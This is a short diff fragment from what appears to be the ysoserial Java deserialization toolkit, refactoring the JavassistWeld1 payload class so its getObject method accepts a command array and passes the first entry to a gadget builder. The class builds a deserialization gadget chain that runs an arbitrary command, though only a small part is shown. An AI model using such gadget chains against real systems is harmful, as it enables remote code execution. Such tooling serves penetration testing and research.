@@ -39,9 +39,9 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
         return JavaVersion.isAtLeast(7);
     }
 
-    public Object getObject(final String command) throws Exception {
+    public Object getObject(final String ... command) throws Exception {
 
-        final Object gadget = Gadgets.createTemplatesImpl(command);
+        final Object gadget = Gadgets.createTemplatesImpl(command[0]);
 
         InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
         ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
